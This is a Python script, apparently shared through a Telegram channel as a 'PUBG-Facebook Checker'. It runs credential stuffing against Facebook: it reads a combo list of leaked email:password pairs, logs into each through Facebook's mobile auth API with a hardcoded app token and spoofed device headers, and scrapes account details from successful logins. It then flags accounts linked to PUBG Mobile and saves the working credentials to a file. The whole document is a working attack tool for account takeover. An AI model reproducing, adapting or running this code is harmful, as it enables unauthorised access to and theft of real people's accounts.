import requests
import urllib.parse
import re
import os
import webbrowser
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'

bss = 0
uus = 0
hit = 0
bad = 0

print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}
|{Z}[+] TeleGram  : {B} @Roox_00    |
|{Z}[+] Channel  : {B}JED ~ ARCHIVE |
|{Z}[+] Tool  : {B} PUBG-Facebook Checker |
{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━ ''')
class FacebookGiris:
    def __init__(self, email, sifre):
        self.email = email
        self.sifre = sifre
        self.giris_url = "https://b-api.facebook.com/method/auth.login"
        self.giris_basliklar = {
            "authority": "b-api.facebook.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "max-age=0",
            "authorization": "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
            "user-agent": "Dalvik/2.1.0 (Linux; U; Android 9; Redmi 7 MIUI/V11.0.6.0.PFLMIXM) [FBAN/MessengerLite;FBAV/115.0.0.2.114;FBPN/com.facebook.mlite;FBLC/ar_EG;FBBV/257412622;FBCR/Orange - STAY SAFE;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi 7;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1369};]"
        }
        self.oturum_cerezleri = {}
        self.cevap_verileri = None
    def giris_yap(self):
        yukle = {
            "email": self.email,
            "password": self.sifre,
            "credentials_type": "password",
            "error_detail_type": "button_with_disabled",
            "format": "json",
            "device_id": "cdc4558c-4dd4-4fd0-9ba6-d09e0223d5e5",
            "generate_session_cookies": "1",
            "generate_analytics_claim": "1",
            "generate_machine_id": "1",
            "method": "auth.login"
        }
        cevap = requests.post(self.giris_url, data=yukle, headers=self.giris_basliklar)
        self.cevap_verileri = cevap.json()
        if "session_key" in self.cevap_verileri:
            print("\033[1;32m Başarılı ✅: Giriş başarılı.")
            self.oturum_cerezleri = {cerez['name']: cerez['value'] for cerez in self.cevap_verileri.get("session_cookies", [])}
            return True
        elif "Invalid username or password" in self.cevap_verileri or "Invalid username or email address" in self.cevap_verileri:
            print(" \033[1;31m Başarısız ❌: Geçersiz kullanıcı adı veya şifre.")
        elif "User must verify" in self.cevap_verileri:
            print(" \033[1;33m Özel: Kullanıcı doğrulamalı 🔒.")
        else:
            print(" \033[1;31m Başarısız: Giriş başarısız ❌.")
        return False
    def kullanici_bilgilerini_al(self):
        if not self.oturum_cerezleri:
            print(" \033[1;36m Oturum çerezleri bulunamadı. Lütfen önce giriş yapın 👮.")
            return
        bilgi_url = "https://m.facebook.com/?refsrc=https%3A%2F%2Fm.facebook.com%2F&_rdr"
        bilgi_basliklar = {
            "Host": "m.facebook.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": "https://m.facebook.com/login/save-device/?login_source=login",
            "Connection": "keep-alive",
            "Cookie": self._cerez_basligini_olustur(),
            "Upgrade-Insecure-Requests": "1",
            "TE": "Trailers"
        }
        cevap = requests.get(bilgi_url, headers=bilgi_basliklar)
        kaynak = cevap.text
        tam_ad = re.search(r'c_user\",\"value\":\"(.*?)\"', kaynak)
        is_ve_business_hesabi = re.search(r'IS_BUSINESS_PERSON_ACCOUNT\":"(.*?)"', kaynak)
        hesap_id = re.search(r'ACCOUNT_ID\":\"(.*?)\"', kaynak)
        self.tam_ad = tam_ad.group(1) if tam_ad else None
        self.is_ve_business_hesabi = is_ve_business_hesabi.group(1) if is_ve_business_hesabi else None
        self.hesap_id = hesap_id.group(1) if hesap_id else None
        print(f" İsim : {self.tam_ad}")
        print(f" Bussines mi ?: {self.is_ve_business_hesabi}")
        print(f"Hesap ID: {self.hesap_id}")
    def bagli_uygulamalari_kontrol_et(self):
        if not self.oturum_cerezleri:
            print(" \033[1;31m Oturum çerezleri bulunamadı. Lütfen önce giriş yapın ❌.")
            return
        uygulamalar_url = "https://www.facebook.com/settings?tab=applications&ref=settings"
        uygulamalar_basliklar = {
            "Host": "m.facebook.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": "https://m.facebook.com/login/save-device/?login_source=login",
            "Connection": "keep-alive",
            "Cookie": self._cerez_basligini_olustur(),
            "Upgrade-Insecure-Requests": "1",
            "TE": "Trailers"
        }
        cevap = requests.get(uygulamalar_url, headers=uygulamalar_basliklar)
        kaynak = cevap.text
        bagli_uygulamalar = re.findall(r'app_name\":\"(.*?)\",\"', kaynak)
        pubg_varmi = "TRUE✔️" if "PUBG Mobile" in bagli_uygulamalar else "FALSE✖️"
        print(f"PUBG Var Mı ?: {pubg_varmi}")
    def _cerez_basligini_olustur(self):
        cerezler = [
            f"{anahtar}={urllib.parse.quote(deger)}"
            for anahtar, deger in self.oturum_cerezleri.items()
        ]
        return "; ".join(cerezler)
    @classmethod
    def combo_dosyasindan(cls):
        dosya_adi = input(" ~ Combo dosyasının adını girin: ")
        print("\x1b[1;39m—" * 60)
        os.system("clear")
        basarili_girisler = []
        try:
            with open(dosya_adi, 'r') as dosya:
                for satir in dosya:
                    email, sifre = satir.strip().split(':')
                    fb_giris = cls(email, sifre)
                    if fb_giris.giris_yap():
                        fb_giris.kullanici_bilgilerini_al()
                        fb_giris.bagli_uygulamalari_kontrol_et()
                        basarili_girisler.append(f"{email}:{sifre}")
                    else:
                        print(f"{email} ile giriş başarısız.")
            with open("Pubg_basarili_girisler.txt", 'w') as cikti_dosyasi:
                for giris in basarili_girisler:
                    cikti_dosyasi.write(giris + '\n')
            print(" \033[1;32m Başarılı girişler 'basarili_girisler.txt' dosyasına kaydedildi ✅.")
        except FileNotFoundError:
            print(f"{dosya_adi} \033[1;31m  dosyası bulunamadı.")
        except Exception as e:
            print(f" \033[1;31m Bir hata oluştu: {e}")
FacebookGiris.combo_dosyasindan()
